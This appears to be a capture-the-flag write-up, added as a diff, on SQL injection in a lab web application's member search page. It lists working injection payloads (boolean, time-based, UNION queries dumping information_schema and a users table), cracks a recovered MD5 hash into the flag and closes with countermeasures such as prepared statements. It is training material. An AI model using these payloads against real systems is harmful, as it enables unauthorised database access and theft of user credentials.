@@ -1,0 +1,60 @@
+http://192.168.57.3/index.php?page=member
+
+Found a vunerability in sql injection,
+In the page "search for member"
+
+By scanning the page we get this information : 
+
+The back-end DBMS is MySQL
+Web server operating system: Linux Ubuntu
+Web application technology: PHP 5.3.10, Nginx 1.8.0
+Back-end DBMS: MySQL >= 5.5
+
+A faille have been found in the "id"
+
+The type of faille are :
+
+- boolean-based blind : test with  "1 or 1=1" this give a list of everything  
+
+- error-based: test with anything that not a number 
+
+- time-based blind : test with "1 AND (SELECT 8903 FROM (SELECT(SLEEP(5)))ASLd)"
+
+- UNION query : test it with "1 UNION ALL SELECT NULL"
+
+---------------------------------------------------------------------------------------
+
+With this we can undestand that we can inject SQL in the ID. 
+
+The boolean based injection give nothing interesting so we going to use the Union query. 
+
+0 or 1 UNION select table_name, column_name FROM information_schema.columns
+
+We know that the original sql request only check 2 parametter with this 
+    1 ORDER BY 2
+If you make a request bigger than 3 it trow error 
+        Unknown column '3' in 'order clause'
+We check everything in the users table with this :
+    "0 or 1 UNION SELECT Commentaire, countersign FROM users"
+And found this code : 
+
+    5ff9d0165b4f92b14994e5c685cdce28
+
+We descript it from md5 to got this : FortyTwo 
+Lower everything to get : FortyTwo
+Encript it in sh256 = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+Flag = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+-------------------------- Countermeasure ----------------------------------------
+
+Lots of this to fixe here :
+    - Don't display any error message from the sql request
+    - Use Prepared Statements :
+        exemple :   dbh->prepare("SELECT * FROM users WHERE USERNAME = ? AND PASSWORD = ?");
+                    stmt->execute(array($username, $password));
+    - Limite privilege on the query request, you should limit the search to only what originaly show in the result,
+        only first name and surname 
+
+https://md5hashing.net/hash/md5/5ff9d0165b4f92b14994e5c685cdce28
+https://www.dcode.fr/md5-hash
